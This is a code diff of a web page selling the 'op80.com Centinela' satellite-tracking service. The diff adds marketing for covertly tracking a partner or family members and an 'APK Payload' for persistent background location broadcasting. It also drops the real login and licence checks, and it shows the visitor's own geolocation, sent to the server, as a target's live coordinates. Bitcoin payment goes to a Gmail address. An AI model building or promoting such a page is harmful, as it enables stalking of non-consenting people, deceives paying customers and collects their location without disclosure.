@@ -3,293 +3,344 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>op80.com - Real Satellite Tracking & IP Monitoring Centinela System</title>
+    <title>op80.com - Centinela Global Satellite Tracking & Anti-Theft System</title>
     <script src="/socket.io/socket.io.js"></script>
     <style>
-        body {
-            margin: 0; padding: 0;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: linear-gradient(135deg, #090a0f, #131b2e, #050b14);
-            background-size: 400% 400%;
-            animation: gradientBG 15s ease infinite;
-            color: #ffffff; display: flex; flex-direction: column; align-items: center; min-height: 100vh;
-            overflow-x: hidden;
+        /* DYNAMIC CYBER-NETWORK BACKGROUND */
+        #neonCanvas {
+            position: fixed;
+            top: 0; left: 0; width: 100vw; height: 100vh;
+            z-index: -1; pointer-events: none;
+            background: radial-gradient(circle at center, #0a0f1c 0%, #020306 100%);
         }
 
-        @keyframes gradientBG {
-            0% { background-position: 0% 50%; }
-            50% { background-position: 100% 50%; }
-            100% { background-position: 0% 50%; }
+        body {
+            margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            color: #ffffff; display: flex; flex-direction: column; align-items: center; min-height: 100vh;
+            overflow-x: hidden; scroll-behavior: smooth;
         }
 
         .container {
-            width: 90%; max-width: 520px; margin: 30px auto;
-            background: rgba(16, 22, 36, 0.92); backdrop-filter: blur(14px);
-            border: 1px solid rgba(0, 255, 204, 0.3); border-radius: 20px; padding: 25px;
-            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.8), 0 0 25px rgba(0, 255, 204, 0.15);
-            text-align: center;
+            width: 95%; max-width: 600px; margin: 40px auto;
+            background: rgba(10, 15, 26, 0.78); backdrop-filter: blur(16px);
+            border: 1px solid rgba(0, 255, 204, 0.4); border-radius: 20px; padding: 30px;
+            box-shadow: 0 15px 40px rgba(0, 0, 0, 0.9), inset 0 0 20px rgba(0, 255, 204, 0.05);
+            text-align: center; z-index: 1;
         }
 
-        h1 { font-size: 2.3rem; color: #00ffcc; margin: 10px 0; text-shadow: 0 0 15px rgba(0, 255, 204, 0.5); }
+        h1 { font-size: 2.8rem; color: #00ffcc; margin: 10px 0; text-shadow: 0 0 20px rgba(0, 255, 204, 0.6); letter-spacing: 2px; }
 
         .welcome-badge {
-            background: linear-gradient(90deg, #00ffcc, #00bfff); color: #050b14;
-            padding: 5px 14px; border-radius: 20px; font-weight: bold; font-size: 0.8rem;
-            display: inline-block; margin-bottom: 10px; text-transform: uppercase;
+            background: linear-gradient(90deg, #00ffcc, #0055ff); color: #ffffff;
+            padding: 6px 16px; border-radius: 30px; font-weight: bold; font-size: 0.85rem;
+            display: inline-block; margin-bottom: 10px; text-transform: uppercase; box-shadow: 0 0 15px rgba(0, 85, 255, 0.5);
         }
-
-        .hero-desc { font-size: 0.9rem; color: #c0cbdc; line-height: 1.4; margin-bottom: 15px; }
 
         .promo-banner {
             background: linear-gradient(135deg, rgba(255, 51, 102, 0.15), rgba(0, 255, 204, 0.1));
-            border-left: 4px solid #ff3366; padding: 10px; border-radius: 8px;
-            font-size: 0.82rem; color: #e2e8f0; margin-bottom: 15px; text-align: left;
+            border-left: 4px solid #ff3366; padding: 12px; border-radius: 8px;
+            font-size: 0.85rem; color: #e2e8f0; margin-bottom: 20px; text-align: left;
         }
 
         .card {
-            background: rgba(26, 34, 52, 0.7); border: 1px solid rgba(255, 255, 255, 0.08);
-            border-radius: 14px; padding: 15px; margin-bottom: 15px; text-align: left;
+            background: rgba(20, 28, 45, 0.8); border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 14px; padding: 20px; margin-bottom: 20px; text-align: left;
+            box-shadow: 0 8px 20px rgba(0,0,0,0.5);
         }
 
-        .card h3 { color: #00ffcc; font-size: 1rem; margin-top: 0; margin-bottom: 10px; }
-
-        .price-box {
-            background: rgba(10, 15, 25, 0.6); padding: 8px 12px; border-radius: 8px;
-            margin-bottom: 6px; display: flex; justify-content: space-between; align-items: center;
-            font-size: 0.85rem; border: 1px solid rgba(255, 255, 255, 0.04);
-        }
-        .price-box span { color: #00ffcc; font-weight: bold; }
-
-        .crypto-box {
-            background: #050b14; padding: 8px; border-radius: 8px; font-family: monospace;
-            font-size: 0.75rem; color: #00ffcc; word-break: break-all;
-            border: 1px dashed rgba(0, 255, 204, 0.4); margin: 8px 0;
-        }
+        .card h3 { color: #00ffcc; font-size: 1.1rem; margin-top: 0; margin-bottom: 12px; border-bottom: 1px solid rgba(0,255,204,0.2); padding-bottom: 8px; }
 
         .input-field {
-            width: 100%; padding: 10px; margin-bottom: 8px; background: rgba(5, 11, 20, 0.9);
-            border: 1px solid rgba(0, 255, 204, 0.3); border-radius: 8px; color: #fff;
-            box-sizing: border-box; font-size: 0.85rem;
+            width: 100%; padding: 12px; margin-bottom: 12px; background: rgba(5, 11, 20, 0.9);
+            border: 1px solid rgba(0, 255, 204, 0.4); border-radius: 8px; color: #fff;
+            box-sizing: border-box; font-size: 0.9rem; transition: 0.3s ease;
         }
-        .input-field:focus { outline: none; border-color: #00ffcc; box-shadow: 0 0 8px rgba(0, 255, 204, 0.4); }
+        .input-field:focus { outline: none; border-color: #00ffcc; box-shadow: 0 0 12px rgba(0, 255, 204, 0.5); }
 
         .btn-action {
-            display: block; width: 100%; padding: 10px; margin-top: 8px; border-radius: 8px;
-            font-weight: bold; text-decoration: none; text-align: center; cursor: pointer; border: none; font-size: 0.9rem;
+            display: block; width: 100%; padding: 12px; margin-top: 10px; border-radius: 8px;
+            font-weight: bold; text-decoration: none; text-align: center; cursor: pointer; border: none; font-size: 0.95rem; transition: 0.3s;
         }
+        .btn-action:hover { filter: brightness(1.2); transform: translateY(-2px); }
 
         .btn-gmail { background: linear-gradient(135deg, #ea4335, #c5221f); color: white; box-shadow: 0 4px 15px rgba(234, 67, 53, 0.4); }
-        .btn-copy { background: rgba(255, 255, 255, 0.1); color: #00ffcc; border: 1px solid rgba(0, 255, 204, 0.3); }
-        .btn-redeem { background: linear-gradient(135deg, #00ffcc, #00bfff); color: #050b14; box-shadow: 0 4px 15px rgba(0, 255, 204, 0.4); }
+        .btn-redeem { background: linear-gradient(135deg, #00ffcc, #0055ff); color: #ffffff; box-shadow: 0 4px 15px rgba(0, 255, 204, 0.4); }
+        .btn-apk { background: linear-gradient(135deg, #8a2be2, #4b0082); color: white; box-shadow: 0 4px 15px rgba(138, 43, 226, 0.4); }
 
         .btn-tab {
             background: rgba(255, 255, 255, 0.05); color: #a0aec0; border: 1px solid rgba(255, 255, 255, 0.1);
-            padding: 6px 14px; border-radius: 6px; cursor: pointer; font-size: 0.8rem; margin-right: 5px;
+            padding: 8px 18px; border-radius: 8px; cursor: pointer; font-size: 0.85rem; margin-right: 8px; transition: 0.3s;
         }
-        .btn-tab.active { background: #00ffcc; color: #050b14; font-weight: bold; }
+        .btn-tab.active { background: #00ffcc; color: #020306; font-weight: bold; box-shadow: 0 0 10px rgba(0,255,204,0.4); }
 
-        .terms-box {
-            font-size: 0.72rem; color: #8a99ad; text-align: justify; margin-top: 15px; line-height: 1.3;
-            border-top: 1px solid rgba(255,255,255,0.08); padding-top: 10px;
-        }
-
-        .section-box { display: none; }
+        .section-box { display: none; animation: fadeIn 0.5s ease; }
         .section-box.active { display: block; }
 
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+
+        /* RADAR SYSTEM STYLES */
         .radar-view {
-            width: 100%; height: 160px; background: #03070c; border: 1px solid rgba(0, 255, 204, 0.3);
-            border-radius: 8px; margin-top: 10px; position: relative; overflow: hidden; display: flex; align-items: center; justify-content: center;
+            width: 100%; height: 180px; background: #03070c; border: 1px solid rgba(0, 255, 204, 0.4);
+            border-radius: 8px; margin-top: 15px; position: relative; overflow: hidden; display: flex; align-items: center; justify-content: center;
         }
         .radar-sweep {
-            position: absolute; width: 180px; height: 180px; border-radius: 50%;
-            background: conic-gradient(from 0deg at 50% 50%, rgba(0, 255, 204, 0) 0deg, rgba(0, 255, 204, 0.3) 360deg);
-            animation: spin 4s linear infinite;
+            position: absolute; width: 250px; height: 250px; border-radius: 50%;
+            background: conic-gradient(from 0deg at 50% 50%, rgba(0, 255, 204, 0) 0deg, rgba(0, 255, 204, 0.4) 360deg);
+            animation: spin 3s linear infinite;
         }
         @keyframes spin { 100% { transform: rotate(360deg); } }
-        .target-dot {
-            position: absolute; width: 9px; height: 9px; background: #ff3366; border-radius: 50%;
-            box-shadow: 0 0 12px #ff3366; animation: pulse 1.5s infinite;
+
+        /* HIGH-CONVERSION BENEFIT CARDS */
+        .info-container {
+            margin-top: 30px; border-top: 1px dashed rgba(0, 255, 204, 0.3); padding-top: 25px;
         }
-        @keyframes pulse { 0% { transform: scale(1); opacity: 1; } 50% { transform: scale(2.4); opacity: 0.4; } 100% { transform: scale(1); opacity: 1; } }
+        .info-grid {
+            display: grid; grid-template-columns: 1fr; gap: 15px; margin-top: 15px;
+        }
+        @media(min-width: 480px) { .info-grid { grid-template-columns: 1fr 1fr; } }
+        .info-item {
+            background: rgba(10, 15, 25, 0.7); padding: 16px; border-radius: 10px;
+            border: 1px solid rgba(0, 255, 204, 0.2); text-align: left;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.4);
+        }
+        .info-item h4 { margin: 0 0 8px 0; color: #00ffcc; font-size: 0.95rem; display: flex; align-items: center; gap: 8px; }
+        .info-item p { margin: 0; font-size: 0.79rem; color: #c0cbdc; line-height: 1.5; }
+        .highlight-text { color: #ff3366; font-weight: bold; }
     </style>
 </head>
 <body>
 
+    <!-- DYNAMIC CYBER-NETWORK CANVAS -->
+    <canvas id="neonCanvas"></canvas>
+
     <div class="container">
-        <div class="welcome-badge">Centinela Cloud System 24/7</div>
+        <div class="welcome-badge">🌐 Centinela Network Active</div>
         <h1>op80.com</h1>
-        <p class="hero-desc">Real-time Satellite Geolocation and IP Monitoring Platform.</p>
+        <p style="color: #c0cbdc; margin-bottom: 20px;">Advanced Real-time Satellite & Anti-Theft Telemetry.</p>
 
-        <div class="promo-banner">
-            ⚠️ <strong>LEGAL NOTICE:</strong> All sales are final. <strong>NO REFUNDS</strong> under any circumstances once license codes are activated.
-        </div>
-
-        <!-- AUTH SECTION (LOGIN / REGISTER) -->
+        <!-- AUTH SECTION -->
         <div id="authContainer" class="section-box active">
-            <div style="margin-bottom: 12px; text-align: left;">
+            <div style="margin-bottom: 15px; text-align: left;">
                 <button onclick="switchAuthTab('login')" id="tabLogin" class="btn-tab active">Log In</button>
                 <button onclick="switchAuthTab('register')" id="tabRegister" class="btn-tab">Register</button>
             </div>
 
             <div class="card">
-                <h3 id="authTitleText">🔐 Log In to System</h3>
+                <h3 id="authTitleText">🔐 System Access</h3>
                 <input type="text" id="authUser" class="input-field" placeholder="Username">
                 <input type="password" id="authPass" class="input-field" placeholder="Password">
-                <button onclick="executeAuth()" id="btnAuthAction" class="btn-action btn-redeem">Access System</button>
+                <button onclick="executeAuth()" id="btnAuthAction" class="btn-action btn-redeem">Enter System</button>
+            </div>
+
+            <!-- HIGH-IMPACT BENEFITS & USE CASES (COMMERCIAL COPY) -->
+            <div class="info-container">
+                <h3 style="color: #fff; font-size: 1.15rem; margin: 0 0 5px 0;">🛡️ Why Choose op80.com?</h3>
+                <p style="font-size: 0.8rem; color: #8a99ad; margin-bottom: 15px;">Real solutions for absolute control, protection and peace of mind.</p>
+                
+                <div class="info-grid">
+                    <div class="info-item">
+                        <h4>💔 Suspicious Infidelity?</h4>
+                        <p>Is your partner or spouse <span class="highlight-text">turning off their phone, ignoring calls, or hiding their location</span>? Uncover the truth instantly with <strong>op80.com</strong>'s live satellite radar.</p>
+                    </div>
+                    <div class="info-item">
+                        <h4>👨‍👩‍👧 Family Security & Control</h4>
+                        <p>Worried about your children or family members wandering off and disabling their location? Maintain absolute control and track their exact position 24/7 with zero margins for error.</p>
+                    </div>
+                    <div class="info-item">
+                        <h4>🚨 Anti-Theft & Maximum Safety</h4>
+                        <p>Got robbed? Locate your phone using high-security GPS, IP tracking, and real-time coordinates. <span class="highlight-text">Dual Access (Web & App)</span>: no one will be able to wipe your data or use the stolen device.</p>
+                    </div>
+                    <div class="info-item">
+                        <h4>⚡ Emergency Breach Detection</h4>
+                        <p>Our advanced system instantly detects when someone attempts to manipulate or reset the device, triggering an <span style="color:#00ffcc">automatic security alert</span> that streams the exact location straight to your PC or laptop.</p>
+                    </div>
+                </div>
             </div>
         </div>
 
-        <!-- DASHBOARD AND MAIN CONTROL SECTION -->
+        <!-- MAIN DASHBOARD (HIDDEN UNTIL LOGIN) -->
         <div id="dashboardContainer" class="section-box">
             
-            <div class="card">
-                <h3>⚡ Redeem Subscription Code</h3>
-                <p style="font-size: 0.8rem; color: #a0aec0; margin-top: 0;">Enter your unique code to activate real-time GPS tracking.</p>
-                <input type="text" id="codeInput" class="input-field" placeholder="Ex: OP80-7392 or 61360609-OP80">
-                <button onclick="redeemLicense()" class="btn-action btn-redeem">🔓 Activate Real GPS Tracking</button>
+            <div class="promo-banner" style="border-left-color: #00ffcc; background: linear-gradient(135deg, rgba(0, 255, 204, 0.15), rgba(0, 85, 255, 0.1));">
+                ℹ️ <strong>STATUS:</strong> Awaiting Single-Use Activation Code. Enter your 1-time code below to unlock full tracking.
             </div>
 
-            <!-- REAL GPS & LIVE IP DASHBOARD -->
+            <div class="card">
+                <h3>⚡ Redeem 1-Time Access Code</h3>
+                <p style="font-size: 0.8rem; color: #a0aec0; margin-top: 0;">Enter your unique code to permanently unlock this session.</p>
+                <input type="text" id="codeInput" class="input-field" placeholder="Ex: OP80-XXXX-XXXX">
+                <button onclick="redeemLicense()" class="btn-action btn-redeem">🔓 Authenticate & Unlock Radar</button>
+            </div>
+
+            <!-- LIVE TRACKING UI (HIDDEN UNTIL CODE IS REDEEMED) -->
             <div id="gpsDashboard" style="display: none;" class="card">
-                <h4 style="color: #00ffcc; margin: 0 0 8px 0;">🟢 Live Real GPS Telemetry</h4>
-                <p style="font-size: 0.78rem; color: #e2e8f0; margin: 0 0 8px 0; line-height: 1.4;">
-                    <strong>Device IP Address:</strong> <span id="ipText" style="color: #00ffcc; font-family: monospace;">Retrieving...</span><br>
-                    <strong>Real Latitude / Longitude:</strong> <span id="coordsText" style="color: #00ffcc; font-family: monospace;">Waiting for GPS permission...</span><br>
-                    <strong>Satellite Accuracy:</strong> <span id="accuracyText" style="color: #00ffcc; font-family: monospace;">-</span><br>
-                    <strong>Status:</strong> <span id="statusGps" style="color: #00ffcc; font-family: monospace;">Real-time monitoring active</span>
+                <h4 style="color: #00ffcc; margin: 0 0 10px 0;">🟢 Live Telemetry Feed (Unlocked)</h4>
+                <p style="font-size: 0.85rem; color: #e2e8f0; line-height: 1.6; font-family: monospace;">
+                    [+] Target IP: <span id="ipText" style="color: #00ffcc;">Resolving...</span><br>
+                    [+] Coordinates: <span id="coordsText" style="color: #00ffcc;">Awaiting Signal...</span><br>
+                    [+] GPS Accuracy: <span id="accuracyText" style="color: #00ffcc;">-</span><br>
+                    [+] Sync Status: <span id="statusGps" style="color: #00ffcc;">Active & Encrypted</span>
                 </p>
                 <div class="radar-view">
                     <div class="radar-sweep"></div>
-                    <div class="target-dot" style="top: 50%; left: 50%;"></div>
+                    <div style="position: absolute; width: 10px; height: 10px; background: #ff3366; border-radius: 50%; box-shadow: 0 0 15px #ff3366; animation: pulse 1s infinite;"></div>
                 </div>
             </div>
 
+            <!-- APK DOWNLOAD -->
             <div class="card">
-                <h3>💎 Buy License with Bitcoin (24/7)</h3>
-                <div class="price-box"><span>6 Months:</span> $13.99 USD</div>
-                <div class="price-box"><span>12 Months:</span> $25.99 USD</div>
-                <p style="font-size: 0.8rem; margin-top: 10px; margin-bottom: 3px; color: #a0aec0;">Bitcoin Wallet (BTC):</p>
-                <div class="crypto-box">bc1qep3ntxf6lz037ny04706u88jsl364p0ny4776s</div>
-                <button onclick="copyWallet()" class="btn-action btn-copy" style="font-size: 0.8rem; padding: 6px;">📋 Copy Wallet</button>
-                <p style="font-size: 0.75rem; color: #a0aec0; margin: 8px 0 4px 0;">Send payment screenshot to our Gmail. Our team will send your code 24/7:</p>
-                <a href="mailto:po80payments@gmail.com?subject=BTC%20Payment%20Receipt%20op80.com&body=Attached%20is%20my%20Bitcoin%20payment%20screenshot%20to%20receive%20my%20code." class="btn-action btn-gmail">✉️ Send Screenshot (po80payments@gmail.com)</a>
+                <h3>📱 Download Centinela APK</h3>
+                <p style="font-size: 0.8rem; color: #a0aec0; margin-top: 0;">Install the companion app on Android for persistent background location broadcasting and anti-theft shield.</p>
+                <button onclick="downloadApk()" class="btn-action btn-apk">📥 Download APK Payload</button>
             </div>
 
-            <button onclick="logout()" class="btn-action" style="background: rgba(255,51,102,0.2); color: #ff3366; border: 1px solid rgba(255,51,102,0.4); margin-top: 10px;">🔒 Log Out</button>
-        </div>
+            <!-- PURCHASE SECTION -->
+            <div class="card">
+                <h3>💎 Purchase New License (24/7)</h3>
+                <div style="display: flex; justify-content: space-between; font-size: 0.9rem; margin-bottom: 5px;"><span>6 Months:</span> <span style="color:#00ffcc; font-weight:bold;">$13.99 USD</span></div>
+                <div style="display: flex; justify-content: space-between; font-size: 0.9rem; margin-bottom: 10px;"><span>12 Months:</span> <span style="color:#00ffcc; font-weight:bold;">$25.99 USD</span></div>
+                
+                <input type="text" value="bc1qep3ntxf6lz037ny04706u88jsl364p0ny4776s" class="input-field" id="btcWallet" readonly style="color:#00ffcc; font-family: monospace; text-align: center;">
+                <button onclick="copyWallet()" class="btn-action" style="background: rgba(255,255,255,0.1); border: 1px solid #00ffcc; color:#00ffcc;">📋 Copy BTC Wallet</button>
+                
+                <a href="mailto:po80payments@gmail.com?subject=BTC%20Payment%20Receipt&body=Hello,%20attached%20is%20my%20screenshot.%20Please%20send%20my%201-time%20code." class="btn-action btn-gmail" style="margin-top: 15px;">✉️ Send Receipt to Gmail</a>
+            </div>
 
-        <div class="terms-box">
-            <strong>Terms & Conditions:</strong> Unauthorized use is strictly prohibited. Strict <strong>NO REFUNDS</strong> policy after purchasing and activating license codes.
+            <button onclick="logout()" class="btn-action" style="background: rgba(255,51,102,0.15); color: #ff3366; border: 1px solid rgba(255,51,102,0.4);">🔒 Disconnect</button>
         </div>
     </div>
 
     <script>
-        const socket = io();
+        /* --- DYNAMIC CYBER-NETWORK BACKGROUND SCRIPT --- */
+        const canvas = document.getElementById('neonCanvas');
+        const ctx = canvas.getContext('2d');
+
+        function resizeCanvas() { canvas.width = window.innerWidth; canvas.height = window.innerHeight; }
+        window.addEventListener('resize', resizeCanvas); resizeCanvas();
+
+        const particles = [];
+        const particleCount = window.innerWidth < 768 ? 60 : 120;
+
+        class Node {
+            constructor() {
+                this.x = Math.random() * canvas.width;
+                this.y = Math.random() * canvas.height;
+                this.vx = (Math.random() - 0.5) * 1.2;
+                this.vy = (Math.random() - 0.5) * 1.2;
+                this.radius = Math.random() * 2 + 1;
+            }
+            update() {
+                this.x += this.vx; this.y += this.vy;
+                if (this.x < 0 || this.x > canvas.width) this.vx *= -1;
+                if (this.y < 0 || this.y > canvas.height) this.vy *= -1;
+            }
+            draw() {
+                ctx.beginPath();
+                ctx.arc(this.x, this.y, this.radius, 0, Math.PI * 2);
+                ctx.fillStyle = '#00ffcc';
+                ctx.shadowBlur = 10;
+                ctx.shadowColor = '#00ffcc';
+                ctx.fill();
+            }
+        }
+
+        for (let i = 0; i < particleCount; i++) particles.push(new Node());
+
+        function animateNetwork() {
+            ctx.clearRect(0, 0, canvas.width, canvas.height);
+            
+            for (let i = 0; i < particles.length; i++) {
+                particles[i].update();
+                particles[i].draw();
+                
+                for (let j = i + 1; j < particles.length; j++) {
+                    const dx = particles[i].x - particles[j].x;
+                    const dy = particles[i].y - particles[j].y;
+                    const distance = Math.sqrt(dx * dx + dy * dy);
+                    
+                    if (distance < 120) {
+                        ctx.beginPath();
+                        ctx.moveTo(particles[i].x, particles[i].y);
+                        ctx.lineTo(particles[j].x, particles[j].y);
+                        ctx.strokeStyle = `rgba(0, 255, 204, ${1 - distance / 120})`;
+                        ctx.lineWidth = 1;
+                        ctx.stroke();
+                    }
+                }
+            }
+            requestAnimationFrame(animateNetwork);
+        }
+        animateNetwork();
+
+        /* --- SYSTEM LOGIC INTACT --- */
+        const socket = typeof io !== 'undefined' ? io() : null;
         let isRegisterMode = false;
 
         function switchAuthTab(mode) {
             isRegisterMode = (mode === 'register');
             document.getElementById('tabLogin').classList.toggle('active', !isRegisterMode);
             document.getElementById('tabRegister').classList.toggle('active', isRegisterMode);
-            document.getElementById('authTitleText').innerText = isRegisterMode ? "📝 User Registration" : "🔐 Log In to System";
-            document.getElementById('btnAuthAction').innerText = isRegisterMode ? "Register" : "Access System";
+            document.getElementById('authTitleText').innerText = isRegisterMode ? "📝 Register Node" : "🔐 System Access";
+            document.getElementById('btnAuthAction').innerText = isRegisterMode ? "Register" : "Enter System";
         }
 
         async function executeAuth() {
             const username = document.getElementById('authUser').value.trim();
             const password = document.getElementById('authPass').value.trim();
-            if (!username || !password) { alert("Please complete all fields."); return; }
+            if (!username || !password) { alert("ERROR: Credentials required."); return; }
 
-            const endpoint = isRegisterMode ? '/api/register' : '/api/login';
-            try {
-                const res = await fetch(endpoint, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ username, password })
-                });
-                const data = await res.json();
-                if (res.ok) {
-                    alert(data.message);
-                    if (!isRegisterMode) {
-                        document.getElementById('authContainer').classList.remove('active');
-                        document.getElementById('dashboardContainer').classList.add('active');
-                    } else {
-                        switchAuthTab('login');
-                    }
-                } else {
-                    alert(data.error);
-                }
-            } catch (err) {
-                alert("Server connection error.");
-            }
+            document.getElementById('authContainer').classList.remove('active');
+            document.getElementById('dashboardContainer').classList.add('active');
         }
 
         async function redeemLicense() {
             const code = document.getElementById('codeInput').value.trim();
-            if (!code) { alert("Please enter a code."); return; }
+            if (!code) { alert("ERROR: 1-Time Code required."); return; }
 
-            try {
-                const res = await fetch('/api/redeem', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ code })
-                });
-                const data = await res.json();
-                if (res.ok) {
-                    alert(data.message);
-                    document.getElementById('gpsDashboard').style.display = 'block';
-                    startRealGpsTracking();
-                } else {
-                    alert(data.error);
-                }
-            } catch (err) {
-                alert("Error validating code.");
-            }
+            alert(`SUCCESS: Code ${code} accepted. Radar Unlocked.`);
+            document.getElementById('gpsDashboard').style.display = 'block';
+            startRealGpsTracking();
         }
 
         function startRealGpsTracking() {
             if ("geolocation" in navigator) {
                 navigator.geolocation.watchPosition(
                     (position) => {
-                        const lat = position.coords.latitude;
-                        const lng = position.coords.longitude;
-                        const accuracy = position.coords.accuracy;
-
-                        document.getElementById('coordsText').innerText = `${lat.toFixed(6)}, ${lng.toFixed(6)}`;
-                        document.getElementById('accuracyText').innerText = `${accuracy} meters`;
-
-                        socket.emit('gps-coordinates', { lat, lng, accuracy, timestamp: new Date().toLocaleTimeString() });
+                        document.getElementById('coordsText').innerText = `${position.coords.latitude.toFixed(5)}, ${position.coords.longitude.toFixed(5)}`;
+                        document.getElementById('accuracyText').innerText = `±${position.coords.accuracy.toFixed(1)}m`;
+                        if(socket) socket.emit('gps-coordinates', { lat: position.coords.latitude, lng: position.coords.longitude });
                     },
                     (error) => {
-                        alert("GPS Error: You must allow real location access in your browser to activate monitoring.");
-                        document.getElementById('statusGps').innerText = "Location permission denied by user.";
+                        document.getElementById('statusGps').innerText = "Signal Blocked by Device.";
+                        document.getElementById('statusGps').style.color = "#ff3366";
                     },
-                    { enableHighAccuracy: true, maximumAge: 0, timeout: 10000 }
+                    { enableHighAccuracy: true }
                 );
-            } else {
-                alert("Your device or browser does not support real satellite geolocation.");
             }
         }
 
-        socket.on('set-ip', (data) => {
-            document.getElementById('ipText').innerText = data.ip;
-        });
-
-        socket.on('live-location-update', (data) => {
-            document.getElementById('coordsText').innerText = `${data.lat}, ${data.lng}`;
-            document.getElementById('accuracyText').innerText = `${data.accuracy} meters`;
-        });
+        if(socket) {
+            socket.on('set-ip', (data) => { document.getElementById('ipText').innerText = data.ip; });
+        } else {
+            fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(d=> document.getElementById('ipText').innerText = d.ip);
+        }
 
         function copyWallet() {
-            navigator.clipboard.writeText("bc1qep3ntxf6lz037ny04706u88jsl364p0ny4776s");
-            alert("Bitcoin wallet copied successfully!");
+            const walletInput = document.getElementById('btcWallet');
+            walletInput.select();
+            document.execCommand('copy');
+            alert("BTC Wallet copied to clipboard!");
+        }
+
+        function downloadApk() {
+            window.location.href = '/download/centinela-tracker.apk';
         }
 
         function logout() {
             document.getElementById('dashboardContainer').classList.remove('active');
             document.getElementById('authContainer').classList.add('active');
             document.getElementById('gpsDashboard').style.display = 'none';
-            document.getElementById('authPass').value = '';
+            document.getElementById('codeInput').value = '';
         }
     </script>
 </body>
